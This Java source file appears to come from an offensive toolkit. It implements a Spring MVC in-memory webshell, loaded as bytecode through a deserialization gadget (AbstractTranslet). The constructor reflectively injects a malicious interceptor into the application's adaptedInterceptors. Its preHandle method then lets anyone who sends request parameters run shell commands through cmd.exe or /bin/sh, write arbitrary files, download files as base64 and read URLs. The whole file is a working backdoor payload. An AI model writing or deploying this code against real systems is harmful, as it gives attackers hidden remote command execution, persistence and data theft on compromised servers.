package com.idiot9.tmp;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.HandlerInterceptor;
import sun.misc.Unsafe;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

//作为反序列化sink动态加载的字节码
public class BadInterceptor_within extends AbstractTranslet implements HandlerInterceptor {
    public BadInterceptor_within() {
        try {
            //获得context
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            //获取 adaptedInterceptors 属性值
            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean("requestMappingHandlerMapping");
            Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);
            java.util.ArrayList<Object> adaptedInterceptors = (java.util.ArrayList<Object>) field.get(abstractHandlerMapping);
            BadInterceptor_within aaa = new BadInterceptor_within("aaa");
            adaptedInterceptors.add(aaa);
            System.out.println("Interceptor has been added");
        }catch (Exception e){}
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    public BadInterceptor_within(String aaaa){}

    public void readDir(java.io.PrintWriter writer, javax.servlet.http.HttpServletRequest request, java.lang.String dir) throws java.lang.Exception {
        java.lang.String urlContent = "";
        java.lang.String read = request.getParameter("read");
        if (read != null) {
            writer.println("Windows file pattern---?read=file:/D:/tmp");
            final java.net.URL url = new java.net.URL(read);
            final java.io.BufferedReader in = new java.io.BufferedReader(new InputStreamReader(url.openStream()));
            java.lang.String inputLine = "";
            while ((inputLine = in.readLine()) != null) {
                urlContent = urlContent + inputLine + "\n";
            }
            in.close();
            writer.println(urlContent);
        }
    }

    public void command(java.io.PrintWriter writer, java.lang.String command) throws java.lang.Exception {
        if (command != null) {
            java.lang.String s = "";
            java.lang.ProcessBuilder p = new java.lang.ProcessBuilder(command.split(" "));
            if(java.lang.System.getProperty("os.name").toLowerCase().contains("win")){
                p = new java.lang.ProcessBuilder(new java.lang.String[]{"cmd.exe", "/c", command});
            }else{
                p = new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/sh", "-c", command});
            }
            java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("\\A");
            s = c.hasNext() ? c.next(): s;
            c.close();
            writer.write(s);
            writer.flush();
            writer.close();
        }
    }

    public void writeFile(java.lang.String writePath, java.lang.String base64) throws java.lang.Exception {
        if (writePath != null && base64 != null) {
            byte[] decode = java.util.Base64.getDecoder().decode(base64);
            new java.io.FileOutputStream(writePath).write(decode);
        }
    }

    public void download(java.io.PrintWriter writer, java.lang.String file) throws java.lang.Exception {
        if (file != null) {
            byte[] bytes = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(file, new String[]{}));
            java.lang.String s = java.util.Base64.getEncoder().encodeToString(bytes);
            writer.write(s);
        }
    }


    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
            PrintWriter writer = response.getWriter();
            String writePath = request.getParameter("writePath");
            String writeBytes = request.getParameter("writeBase64");
            writeFile(writePath, writeBytes);
            String filePath = request.getParameter("download");
            download(writer, filePath);
            String dir = request.getParameter("read");
            readDir(writer, request, dir);
            String command = request.getParameter("code");
            command(writer, command);
            return false;
    }


}
